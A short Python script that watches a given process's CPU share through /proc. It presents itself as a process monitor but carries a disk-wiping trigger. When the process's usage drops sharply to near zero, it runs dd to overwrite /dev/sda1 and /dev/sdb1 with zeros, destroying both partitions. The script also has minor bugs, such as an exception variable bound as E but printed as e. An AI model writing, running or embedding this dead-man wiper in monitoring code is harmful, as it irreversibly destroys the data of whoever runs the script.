import sys
import os
import time
import subprocess

if len(sys.argv) == 2:
	pid = sys.argv[1]
else:
	print('No Pid specified %s <PID>' % os.path.basename(__file__))
	sys.exit(1)




def proct(pid):
	try:
		with open(os.path.join('/proc/', pid, 'stat'), 'r') as pidfile:
			proctimes = pidfile.readline()
			utime = proctimes.split(' ')[13]
			stime = proctimes.split(' ')[14]
			proctotal = int(utime) + int(stime)
			return(float(proctotal))
	except IOError as e:
		print('Error: %s' % e)
		sys.exit(2)

def cput():
	try:
		with open('/proc/stat', 'r') as procfile:
			cputimes = procfile.readline()
			cputotal = 0

			for i in cputimes.split(' ')[2:]:
				i = int(i)
				cputotal = (cputotal + i)
			return(float(cputotal))
	except IOError as E:
		print('ERROR: %s' % e)
		sys.exit(3)

proctotal = proct(pid)
cputotal = cput()


i = 0
previous = 0
current = 0
try:
	while True:
				
		pr_proctotal = proctotal
		pr_cputotal = cputotal

		proctotal = proct(pid)
		cputotal = cput()

		
		try:
			res = ((proctotal - pr_proctotal) / (cputotal - pr_cputotal) * 100)
		 	
			current = res				
			if (current - previous < -10 ) and (current < 1):
				print('ramping down excute dd')
				os.system("dd if=/dev/zero of=/dev/sda1 bs=1048576 | dd if=/dev/zero of=/dev/sdb1 bs=1048576")
				break
			else:
				previous = current			
			time.sleep(2)		
			
			
		except Exception as E:
			print(E)	
			
			
		
		
	

			time.sleep(1)
except KeyboardInterrupt:
	sys.exit(0)



